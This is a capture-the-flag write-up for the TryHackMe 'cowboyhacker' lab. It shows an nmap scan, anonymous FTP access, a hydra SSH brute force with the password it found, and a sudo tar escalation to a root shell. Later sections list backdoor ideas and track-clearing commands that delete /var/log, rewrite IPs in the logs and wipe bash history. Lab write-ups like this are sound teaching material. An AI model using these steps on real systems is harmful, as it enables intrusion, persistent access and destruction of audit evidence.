---
title: "THM:cowboyhacker"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/cowboyhacker"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,ftp,hydra,apache,ubuntu,privesc,sudo
---
# THM:cowboyhacker

URL: [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/cowboyhacker) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

## Scanning

### Scan: `nmap`

Ran the following:

> `nmap -vv xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```
PORT      STATE  SERVICE         REASON
20/tcp    closed ftp-data        conn-refused
21/tcp    open   ftp             syn-ack
22/tcp    open   ssh             syn-ack
80/tcp    open   http            syn-ack
```

*Also see: [nmap.log](nmap.log)*

### Scan: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://xxx.xxx.xxx.xxx`

This resulted in two directories being found:

* `/images/` - only images.
* `/server-status` - got `403 Forbidden`.

*Also see: [gobuster.log](gobuster.log)*

## Gaining Access


### FTP Service

Since FTP was running, we log in as `anonymous`:

> `ftp anonymous@xxx.xxx.xxx.xxx`

After doing a directory listing with `ls` or `dir`, we see there are two files there: `locks.txt` and `task.txt`. We retrieve these files back down to our workstation:

> `mget *.txt ./`

This does a (multiple)-get of `*.txt` files and puts them in our current directory on the workstation. The two files:

* [locks.txt](locks.txt)
* [task.txt](task.txt)

### Cracking SSH password for `lin`

We know from the `task.txt` file that the username is `lin`. The contents of `locks.txt` look at lot like leet-speak passwords. So, we can use hydra to see if any of those are the password for the `lin` account:

> `hydra -l lin -P ./locks.txt ssh://10.10.47.229`

And we find that one is found:

```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-19 21:01:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.47.229:22/
[22][ssh] host: 10.10.47.229   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-19 21:02:04
```

*Also see: [hydra.log](hydra.log)*

With that username and password, we can SSH into the box:

> `ssh lin@xxx.xxx.xxx.xxx`

And we use the password `RedDr4gonSynd1cat3` found by hydra, above. We are now logged in as an **unprivileged account** and can retrieve the `~/user.txt` flag, the first flag for this room.

## PE: Sudo Privileges

Logged-in as user `lin`, we check to see if we have any `sudo` permission:

> `sudo -l`

We do! Oddly enough, it is for the `tar` command. We can go look up privesc techniques over on gtfobins:

> https://gtfobins.github.io/gtfobins/tar/#sudo

Using this technique, that means that as `tar` is running as root, we could coerce it to run a command upon a checkpoint. For example, it could open a new bash prompt. Since tar would be running as `root`, that bash prompt would be running as root. So, we execute the following:

> `sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`

You see an error message, but **it does dump you at a root prompt!** From here, one can `cat /root/root.txt` to complete the room. That is the second flag to capture for this room.


## Maintaining Access

This is a test machine. However, in a Red Team scenario, we could:

* Add SSH key to `/root/.ssh/authorized_keys`
* Create a privileged account that wouldn't draw attention (ex: `operations`).
* Install some other backdoor or service.

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`
>  
> `cat /dev/null > /home/kathy/.bash_history`
>  
> `cat /dev/null > /home/sam/.bash_history`

## Summary

Completed: `2022-01-19 21:18:28`